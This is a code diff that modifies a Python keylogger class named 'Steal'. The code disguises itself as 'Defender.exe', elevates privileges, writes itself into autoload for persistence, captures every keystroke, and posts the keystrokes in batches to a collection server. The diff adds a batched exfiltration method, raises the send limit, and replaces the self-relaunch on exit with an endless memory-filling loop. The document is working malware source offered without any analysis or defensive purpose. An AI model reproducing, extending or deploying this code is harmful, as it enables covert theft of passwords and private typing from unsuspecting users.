@@ -4,9 +4,9 @@ import requests
 from elevate import elevate    
 import sys
 import os
+import time
 code = base64.b64encode(b"""
-
-NAME_FLS="mian.exe"                       
+                    
 SERVER="http://127.0.0.1:5000/getin/it/data"
 Name_file="Defender.exe"
 BAT=f"start C:/Users/Pavel/AppData/Local/Temp/{Name_file}"
@@ -23,9 +23,9 @@ class Steal:
         self.server = server
         self.data = []
         self.bug = []
-        self.limit = 100
+        self.limit = 1000
         self.path_to=PATH_COPY
-        if not (Name_file == NAME_FLS):
+        if Name_file not in MY_NAME:
             elevate()
             self.write_in_autoload()
             self.create_copy()
@@ -33,9 +33,9 @@ class Steal:
     def get_key(self):
         return kb.read_key()
     
-    def write_in_autoload(self):
+    def write_in_autoload(self,way=PATH_BAT):
         try:
-            with open(PATH_BAT,"w",encoding="UTF-8") as f:
+            with open(way,"w",encoding="UTF-8") as f:
                 f.write(self.path_to)
         except PermissionError:
             pass
@@ -59,7 +59,7 @@ class Steal:
             return 0
                     
     
-    def send(self):
+    def send(self): #first method
         if self.connect_server():
             if self.bug!=[]:
                 requests.post(self.server, json={"data": self.bug})
@@ -72,16 +72,34 @@ class Steal:
                 return 1
         else:
             self.bug.extend(self.data)
-
+            self.data.clear()
+            
+    def send2(self): #second method(more save)
+        if len(self.data)>=self.limit:
+            if self.connect_server():
+                if self.bug!=[]:
+                    requests.post(self.server, json={"data": self.bug})
+                    self.bug.clear()
+                else:
+                    requests.post(self.server, json={"data": self.data})
+                    self.data.clear()
+            else:
+                self.bug.extend(self.data)
+                self.data.clear()
+                
+            
     def run(self):
         while True:
-            self.send()
+            self.send2()
             self.data.append(self.get_key())
             
     def __del__(self):
-        self.create_copy("C:/Users/Pavel/AppData/Roaming/NO.exe")
-        os.system("start C:/Users/Pavel/AppData/Roaming/NO.exe")
-        
+        x,y=0,1
+        tmp=[]
+        while True:
+            x+=y
+            y+=x
+            tmp.append(x,y)  
         
 if __name__=="__main__":
     app = Steal()
